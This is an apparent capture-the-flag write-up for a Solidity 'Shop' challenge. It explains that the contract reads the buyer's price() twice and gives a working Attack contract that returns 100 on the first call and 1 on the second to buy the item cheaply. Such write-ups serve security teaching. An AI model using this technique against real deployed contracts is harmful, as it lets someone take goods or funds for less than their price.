Objective:
Buy the item from the Shop contract for less than 100.

<details>
<summary>See the original contract</summary>

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;
    function buy() public {
        Buyer _buyer = Buyer(msg.sender);
        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
</details>

Expalanation:
```
if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
```
If we check this if condition we clearly see that the price funtion is called twice, so what we can do is that during the first call we can return 100 and during the second call we can return a lesser value and this we can check with the isSold function that we make in our helper contract.

Solution:
Below is the helper contract.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function isSold() external view returns (bool);

}

contract Attack {
    Shop shop;
   constructor (address _target) {
    shop = Shop(_target);
   }
   function price() external view returns (uint256) {
        return shop.isSold() ? 1 : 100;
    }

    function attack() external {
        shop.buy();
    }
}
```
After deploying this helper contract call the attack function after which the level will be cleared.

Key Takeaways:
The contract thinks that the price() will be constant but as it is called twice we switch its behaviour between the calls.
